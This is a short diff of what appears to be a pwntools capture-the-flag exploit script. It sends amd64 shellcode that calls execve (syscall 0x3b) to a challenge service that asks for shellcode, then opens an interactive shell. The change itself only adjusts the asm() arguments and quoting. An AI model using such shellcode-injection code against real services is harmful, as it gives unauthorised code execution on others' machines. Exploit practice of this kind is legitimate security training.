@@ -22,8 +22,8 @@ shellcode = asm('''
     xor rdx, rdx
     mov al, 0x3b
     syscall
-''', arch='amd64')
-p.sendlineafter(b'giv me sm shllcde & i\'ll run it. keep it shrt!', shellcode)
+''')
+p.sendlineafter(b"giv me sm shllcde & i\'ll run it. keep it shrt!", shellcode)
 
 p.interactive()
 
